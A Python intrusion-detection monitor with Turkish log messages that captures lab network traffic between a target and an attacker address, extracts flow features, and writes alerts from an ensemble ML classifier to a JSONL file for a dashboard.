#!/usr/bin/env python3
import os, time, logging, threading, queue, signal, json
from datetime import datetime
from pathlib import Path
import pyshark
from feature_extractor import FeatureExtractor
from predictor import Predictor

INTERFACE   = os.environ.get("CAPTURE_INTERFACE", "eth0")
TARGET_IP   = os.environ.get("TARGET_IP",         "172.20.0.10")
ATTACKER_IP = os.environ.get("ATTACKER_IP",       "172.20.0.20")
OUTPUT_DIR  = Path(os.environ.get("OUTPUT_DIR",   "/app/captures"))
ROTATION    = 60

OUTPUT_DIR.mkdir(parents=True, exist_ok=True)
Path("/app/logs").mkdir(parents=True, exist_ok=True)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler("/app/logs/capture.log")
    ]
)
log = logging.getLogger("IDS")

_stop = threading.Event()
signal.signal(signal.SIGINT,  lambda s,f: _stop.set())
signal.signal(signal.SIGTERM, lambda s,f: _stop.set())

ALERTS_FILE = Path("/app/logs/alerts.jsonl")
IDS_MODE    = os.environ.get("IDS_MODE", "ensemble")  # ensemble | fast | accurate

pkt_queue  = queue.Queue(maxsize=1000)
extractor  = FeatureExtractor()
predictor  = Predictor(mode=IDS_MODE)
stats      = {"captured": 0, "flows": 0, "attacks": 0, "errors": 0}

def pcap_path():
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    return str(OUTPUT_DIR / f"capture_{ts}.pcap")

def capture_loop():
    log.info(f"Dinleme basliyor -> {INTERFACE}")
    bpf = f"host {TARGET_IP} or host {ATTACKER_IP}"
    cap = pyshark.LiveCapture(
        interface=INTERFACE,
        bpf_filter=bpf,
        output_file=pcap_path(),
        use_json=True
    )
    try:
        for pkt in cap.sniff_continuously():
            if _stop.is_set():
                break
            try:
                pkt_queue.put_nowait(pkt)
                stats["captured"] += 1
            except queue.Full:
                pass
    except Exception as e:
        log.error(f"Yakalama hatasi: {e}")
        stats["errors"] += 1
    finally:
        cap.close()

def process_loop():
    batch = []
    last  = time.time()
    while not _stop.is_set():
        try:
            batch.append(pkt_queue.get(timeout=1.0))
        except queue.Empty:
            pass
        if time.time() - last >= ROTATION and batch:
            log.info(f"Ozellik cikarimi: {len(batch)} paket")
            try:
                df = extractor.extract_from_packets(batch)
                if df is not None and not df.empty:
                    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
                    out = OUTPUT_DIR / f"features_{ts}.csv"
                    df.to_csv(out, index=False)
                    stats["flows"] += len(df)
                    log.info(f"{len(df)} akis -> {out.name}")
                    # Tahmin yap ve uyarıları kaydet
                    try:
                        results = predictor.predict(df)
                        if not results.empty:
                            attacks = results[results["is_attack"]]
                            stats["attacks"] += len(attacks)
                            _write_alerts(results)
                            if not attacks.empty:
                                log.warning(f"[ALARM] {len(attacks)} SALDIRI TESPİT EDİLDİ!")
                    except Exception as pe:
                        log.error(f"Tahmin hatasi: {pe}")
            except Exception as e:
                log.error(f"Cikarim hatasi: {e}")
                stats["errors"] += 1
            batch.clear()
            last = time.time()
            log.info(f"[STATS] captured={stats['captured']} flows={stats['flows']} attacks={stats['attacks']} errors={stats['errors']}")

def _write_alerts(results):
    """Her akışı alerts.jsonl dosyasına yazar (dashboard okur)."""
    try:
        with open(ALERTS_FILE, "a", encoding="utf-8") as f:
            for _, row in results.iterrows():
                record = {
                    "ts":         datetime.now().isoformat(),
                    "src_ip":     str(row.get("src_ip", "")),
                    "dst_ip":     str(row.get("dst_ip", "")),
                    "src_port":   int(row.get("src_port", 0)),
                    "dst_port":   int(row.get("dst_port", 0)),
                    "is_attack":  bool(row.get("is_attack", False)),
                    "lgbm":       int(row.get("lgbm_pred", 0)),
                    "cnn":        int(row.get("cnn_pred", 0)),
                    "lstm":       int(row.get("lstm_pred", 0)),
                    "mode":       str(row.get("mode", "")),
                    "latency_ms": float(row.get("latency_ms", 0)),
                }
                f.write(json.dumps(record, ensure_ascii=False) + "\n")
    except Exception as e:
        log.error(f"Alert yazma hatasi: {e}")

log.info("=" * 50)
log.info("  IDS Monitor Basladi")
log.info(f"  Interface : {INTERFACE}")
log.info(f"  Target    : {TARGET_IP}")
log.info(f"  Attacker  : {ATTACKER_IP}")
log.info("=" * 50)

t1 = threading.Thread(target=capture_loop, daemon=True)
t2 = threading.Thread(target=process_loop, daemon=True)
t1.start(); t2.start()

while not _stop.is_set():
    time.sleep(1)

log.info("Durduruluyor...")
t1.join(timeout=5); t2.join(timeout=5)
log.info("IDS Monitor durduruldu.")